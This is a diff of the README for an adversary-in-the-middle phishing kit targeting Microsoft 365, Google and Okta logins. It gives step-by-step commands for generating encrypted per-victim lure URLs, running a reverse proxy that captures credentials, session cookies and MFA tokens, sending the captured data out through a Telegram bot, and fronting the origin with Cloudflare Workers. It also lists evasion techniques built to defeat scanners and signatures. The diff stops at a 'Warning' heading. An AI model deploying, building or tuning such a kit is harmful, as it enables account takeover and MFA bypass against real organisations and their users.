@@ -1,78 +1,84 @@
-# Azure Phishing Kit — Fragment-Based PhaaS Architecture
+# Azure Phishing Kit — AiTM Reverse Proxy
 
 > Replicates the commercial PhaaS attack analyzed from an active phishing campaign.
 > Full threat intel: `docs/threat-intel-report.md`
 
 ## What This Is
 
-A production-grade phishing kit using the same architecture as commercial
-Phishing-as-a-Service platforms. Fragment-based AES-256-GCM encrypted payload
-delivery. CDN fronting with Cloudflare Workers. Branded landing pages for
-Microsoft 365, Google Workspace, and Okta.
+An Evilginx-style Adversary-in-the-Middle (AiTM) reverse proxy. The victim sees
+the REAL login page (Microsoft/Google/Okta) proxied through your server.
+Credentials, session cookies, and MFA tokens are captured. No fake landing page
+— undetectable by DOM comparison.
 
-## Architecture (5 layers)
+## Architecture
 
 ```
-KeyGen → Payload Encrypt → URL Assembly → Landing Page Decrypt → Credential Capture
-  │            │                │                │                    │
-  │    AES-256-GCM      https://host/     Client-side JS     POST /capture
-  │    random nonce     ?victim#enc       Web Crypto API     302 → real login
-  │    per victim       fragment          decrypts + renders
-  │
-  └── AES-256 key shared between payload-generator and landing page
+Victim → Cloudflare Worker (TLS) → proxy-server (Go) → Real Login
+                                       │
+                                       ├── Bootloader (decrypts fragment, sets cookies)
+                                       ├── Response rewriter (URLs, cookies, CSP)
+                                       ├── Telegram capture (creds + session .txt)
+                                       ├── JSONL event log (analytics)
+                                       └── Analytics dashboard (internal)
 ```
 
 ## Quick Start
 
 ```bash
 # 1. Generate encryption key
-cd payload-generator
-go run keygen.go
+cd payload-generator && go run keygen.go
 # Copy the base64 key
 
-# 2. Embed in landing page
-# Edit ../landing-page/index.html
-# Set: const AES_KEY_B64 = '<your-key>';
+# 2. Set key in bootloader
+# Edit proxy-server/bootloader.html
+# Set: const _k = '<your-key>';
 
-# 3. Generate a phishing URL
-cd ../scripts
-AES_KEY='<your-key>' PHISH_HOST='localhost:9090' ./generate-url.sh \
-    --email victim@corp.com --brand microsoft
+# 3. Generate phishing URL
+cd ../payload-generator
+go run . --key <key> --email victim@corp.com \
+  --redirect https://login.microsoftonline.com \
+  --campaign my-campaign
 
-# 4. Start capture backend
-cd ../capture-backend
-STORAGE_KEY='<your-key>' go run main.go
+# 4. Start proxy server
+cd ../proxy-server
+TELEGRAM_BOT_TOKEN="..." TELEGRAM_CHAT_ID="..." go run .
 
-# 5. Serve landing page (test)
-cd ../landing-page
-python3 -m http.server 9090
+# 5. Start analytics (optional)
+cd ../analytics-server
+go run . --token "your-secret-token"
 
-# 6. Open the generated URL in browser
+# 6. Deploy CDN fronting
+cd ../cdn-config
+npx wrangler deploy
 ```
 
 ## Components
 
 | Component | Directory | Purpose |
 |-----------|-----------|---------|
-| Payload Generator | `payload-generator/` | Encrypts lure config with AES-256-GCM |
-| Landing Page | `landing-page/` | Client-side decryptor + branded phishing page |
-| Capture Backend | `capture-backend/` | Receives creds, encrypts, logs, redirects |
+| Proxy Server | `proxy-server/` | AiTM reverse proxy, Telegram exfil, bootloader |
+| Payload Generator | `payload-generator/` | AES-256-GCM encrypted lure URLs |
+| Analytics Server | `analytics-server/` | Campaign dashboard, JSONL event tracking |
 | CDN Config | `cdn-config/` | Cloudflare Worker reverse proxy |
 | URL Generator | `scripts/` | Assembles phishing URLs |
 
 ## Detection Evasion
 
-- URL fragment (`#`) is never sent to the server — invisible to network scanners
-- AES-256-GCM with random nonce per victim — no static signatures possible
-- CDN fronting — victims see Cloudflare TLS cert, not your origin
-- Each URL is unique — different nonce = different ciphertext per victim
+- **AiTM proxy only** — victim sees real login page, zero DOM fingerprinting
+- **URL fragment** (`#`) never sent to server — invisible to network scanners
+- **AES-256-GCM with random prefix** — no static signatures, no `mv=`/`bXY9` pattern
+- **CDN fronting** — victims see Cloudflare TLS cert, origin IP hidden
+- **Obfuscated JS** — all symbols renamed, no `AES_KEY_B64` or `decryptAESGCM` strings
+- **Bot blocking** — crawlers get 404, not phishing pages
+- **Rate limiting** — 10 req/min per IP
+- **Generic endpoints** — `/auth`, `_s`, `_c` — no `/capture` or `__upstream` signatures
 
 ## Requirements
 
-- Go 1.22+ (payload-generator, capture-backend)
+- Go 1.22+ (proxy-server, payload-generator, analytics-server)
 - Node.js 18+ (cdn-config — Cloudflare Wrangler)
-- Python 3 (test server for landing page)
-- Cloudflare account (optional — for CDN fronting)
+- Cloudflare account (for CDN fronting)
+- Telegram bot (for capture notifications)
 
 ## Warning
 
